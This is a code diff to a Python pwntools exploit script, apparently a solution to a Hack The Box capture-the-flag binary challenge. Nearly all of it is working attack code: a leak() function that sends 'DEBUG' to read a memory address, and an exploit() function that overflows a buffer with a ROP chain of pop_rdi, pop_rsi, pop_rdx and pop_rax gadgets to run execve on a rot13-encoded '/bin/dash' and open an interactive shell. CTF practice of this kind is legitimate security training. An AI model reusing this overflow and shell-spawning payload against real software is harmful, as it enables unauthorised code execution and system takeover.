@@ -36,33 +36,16 @@ def parse_addr(message):
     addr = re.findall(r'0x[a-f0-9]*\n',message)[0].strip()
     return addr
 
-def get_debug(process,recv_first=True):
+
+def leak(process):
     payload = "DEBUG"
-    if recv_first:
-        print(process.recvline()),
-        print(payload)
+    print(process.recvline()),
+    print(payload)
     process.sendline(payload)
     message = process.recvline()
     print(message),
     address = parse_addr(message)
     return address
-
-def leak(proc):
-    fill = "A"*(BUFFSIZE-10)
-    address = get_debug(proc)
-    
-    payload = rot13("/bin/dash\x00")+fill
-    payload += rot13(pop_rdi) + p64(int(address,0)-224)
-    payload += pop_rsi + p64(0) + p64(0)
-    payload += pop_rdx + p64(0) + p64(0)
-    payload += pop_rax + p64(59)
-    payload += syscall
-    payload += rot13(main_addr)
-
-    print(proc.recvline()),
-    print("Sent: {}".format(payload))
-    proc.sendline(payload)
-    proc.interactive()
 
 def overflow(proc,num):
     try:
@@ -78,12 +61,24 @@ def overflow(proc,num):
         raise e
     pass
 
-def exploit():
-    pass
+def exploit(proc,address):
+    call = "/bin/dash\00"
+    fill = "A"*(BUFFSIZE-len(call))
 
-def logit(data):
-    with open("payload","ab") as f:
-        f.write(data)
+    payload = rot13("/bin/dash\x00")+fill
+    payload += rot13(pop_rdi) + p64(int(address,0)-224)
+    payload += pop_rsi + p64(0) + p64(0)
+    payload += pop_rdx + p64(0) + p64(0)
+    payload += pop_rax + p64(59)
+    payload += syscall
+    payload += rot13(main_addr)
+
+    print(proc.recvline()),
+    print("Sent: {}".format(payload))
+    
+    proc.sendline(payload)
+    proc.interactive()
+
 
 def setup():
     global binary
@@ -99,7 +94,8 @@ def main():
     
     p = process(BINARY)
     #p = remote("docker.hackthebox.eu",44744)
-    leak(p)
+    address = leak(p)
+    exploit(p,address)
     p.close()
 
 if __name__ == '__main__':
